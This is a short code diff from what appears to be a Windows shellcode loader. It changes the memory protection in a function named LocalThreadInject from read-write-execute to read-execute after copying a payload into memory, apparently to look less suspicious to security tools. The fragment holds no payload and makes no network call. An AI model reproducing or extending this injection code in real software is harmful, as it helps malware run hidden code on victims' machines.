@@ -19,7 +19,7 @@ BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     memcpy( pPayloadAddress, pbPayload, sPayloadSize );
     memset( pbPayload, '\0', sPayloadSize );
 
-    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) ) {
+    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
         #ifdef DEBUG
         printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
         #endif // !DEBUG
